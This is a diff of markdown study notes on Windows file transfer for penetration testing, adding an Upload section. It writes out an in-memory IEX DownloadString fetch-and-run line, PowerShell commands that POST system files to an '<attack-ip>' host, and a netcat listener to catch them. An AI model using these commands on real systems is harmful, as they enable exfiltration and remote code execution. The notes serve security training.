@@ -1,10 +1,10 @@
 # *Windows*
-- ### *PowerShell Base64 Encode & Decode*
-	- Encode SSH key using `cat id_rsa | base64 -w 0;echo`.
-	- Copy the content and put it into a Windows PowerShell and use some PowerShell functions to decode it using `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))`.
-	- Confirm the file was transferred successfully using `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`.
-	- **NOTE:** CMD has a maximum string length of 8,191 characters, which could make this method not impossible.
 - ### *Download*
+	- ##### *PowerShell Base64 Encode & Decode*
+		- Encode SSH key using `cat id_rsa | base64 -w 0;echo`.
+		- Copy the content and put it into a Windows PowerShell and use some PowerShell functions to decode it using `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))`.
+		- Confirm the file was transferred successfully using `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`.
+		- **NOTE:** CMD has a maximum string length of 8,191 characters, which could make this method not impossible.
 	- ##### PowerShell
 		- **System.Net.WebClient**
 			- Download a file over `HTTP, HTTPS or FTP`.
@@ -40,3 +40,26 @@
 					- `echo GET file.txt >> ftpcommand.txt`
 					- `echo bye >> ftpcommand.txt`
 					- `ftp -v -n -s:ftpcommand.txt`
+- ### *Upload*
+	- Used in situations such as password cracking, analysis, exfiltration, etc.
+	- ##### PowerShell Base64 Encode & Decode
+		- Encode file to Base64 using `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))` then use `Get-FileHash "C:\Windows\System32\drivers\etc\hosts" -Algorithm MD5 | select Hash` to get the hash to be compared later.
+		- Copy the content and paste it into attack host and use `echo "<base64>" | base64 -d > hosts` to save it to a file.
+		- Compare the hashes using `md5sum hosts`.
+	- ##### PowerShell Web Uploads
+		- PowerShell doesn't have a built-in function for upload operations, but `Invoke-WebRequest` or `Invoke-RestMethod` to build an upload function. Also, a web server that accepts uploads, which is not a default option in most common web server utilities, is needed.
+		- **Installing a Configured Web Server with Upload**
+			- `uploadserver` which is an extended module of the Python `HTTP.server` module which includes a file upload page.
+			- Install using `pip3 install uploadserver`.
+			- Start the server using `python3 -m uploadserver`, default port is `8080` and path is `/upload`.
+		- **PowerShell Script to Upload a File to Python Upload Server**
+			- Use the [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) PowerShell script which uses `Invoke-RestMethod` to perform the upload operations.
+			- The script accepts two parameters `-File` which is the file path, and `-Uri` which is the upload destination.
+			- Load script to memory (Fileless Download) using `IEX(New-Object Net.WebClient).DownloadString('https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1')`.
+			- Upload the file using `Invoke-FileUpload -Uri http://<attack-ip>:8080/upload -File C:\Windows\System32\drivers\etc\hosts`.
+		- **PowerShell Base64 Web Upload**
+			- Use `Invoke-WebRequest` or `Invoke-RestMethod` with Netcat.
+			- Encode file using `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`.
+			- Use `Invoke-WebRequest -Uri http://<attack-ip>:8080/ -Method POST -Body $b64` to send a POST request with the file to the attacking machine.
+			- Catch the Base64 data using `nc -lvnp 8080`.
+			- Decode using `echo <base64> | base64 -d -w 0 > hosts`.
